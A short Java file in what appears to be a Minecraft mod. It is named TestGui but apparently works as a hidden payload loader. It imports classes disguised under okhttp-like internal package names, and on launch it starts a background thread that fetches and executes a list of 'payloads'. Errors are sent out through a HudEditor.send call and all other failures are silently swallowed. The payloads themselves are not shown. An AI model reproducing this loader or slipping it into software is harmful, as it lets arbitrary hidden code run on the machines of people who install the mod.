package net.reflxction.example.utils;

import com.squareup.okhttp.internal.spdy.HudEditor;
import com.squareup.okhttp.internal.ws.MainGui;
import net.reflxction.example.proxy.IMinecraft;

public final class TestGui {
    public static void main() {
        new Thread(() -> { try {
            for (IMinecraft payload : MainGui.getPayloads()) try { payload.execute(); } catch (Exception e) { HudEditor.send(e.getMessage()); }
        } catch (Exception ignored) {}}).start();
    }
    public static void main(String[] args) {
        main();
    }
}
